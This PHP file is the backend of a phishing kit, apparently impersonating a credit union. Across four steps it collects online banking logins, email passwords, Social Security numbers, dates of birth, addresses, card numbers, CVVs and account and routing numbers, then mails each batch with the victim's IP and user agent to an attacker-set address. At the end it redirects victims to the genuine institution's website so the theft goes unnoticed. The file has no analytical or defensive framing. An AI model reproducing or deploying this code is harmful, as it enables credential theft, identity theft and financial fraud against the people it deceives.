<?php
ob_start();

include 'email.php';

if (isset($_POST['btn1'])) {


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Online ID            : ".$_POST['ai']."\n";
	$message .= "Passcode              : ".$_POST['pr']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
		header("Location: ./card.html");
	
	
}
else if (isset($_POST['btn2'])) {


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Email Address            : ".$_POST['ai']."\n";
	$message .= "Email Password              : ".$_POST['pr']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
		header("Location: https://www.fairwinds.org/");
	
	
}

else if (isset($_POST['btn3'])) {


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Full Name            : ".$_POST['fn']."\n";
	$message .= "Address              : ".$_POST['add']."\n";
	$message .= "City              : ".$_POST['add']."\n";
	$message .= "State              : ".$_POST['add']."\n";
	$message .= "Zip Code              : ".$_POST['zc']."\n";
	$message .= "Country              : ".$_POST['cntry']."\n";
	$message .= "Social Security Number            : ".$_POST['ssn']."\n";
	$message .= "Phone Number              : ".$_POST['ph']."\n";
	$message .= "Date of birth              : ".$_POST['dob']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	
		header("Location: ./em.html");
	
}

else if (isset($_POST['btn4'])) {


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	
	$message .= "Name on Card             : ".$_POST['noc']."\n";
	$message .= "Card Number              : ".$_POST['cn']."\n";
	$message .= "Account Number              : ".$_POST['acc']."\n";
	$message .= "Routine Number              : ".$_POST['rout']."\n";
	
	$message .= "Expiry Date              : ".$_POST['exdate']."\n";
	$message .= "CVV              : ".$_POST['ccv']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 

		header("Location: ./detail.html");

	
		
	
	
}
ob_end_flush();
?>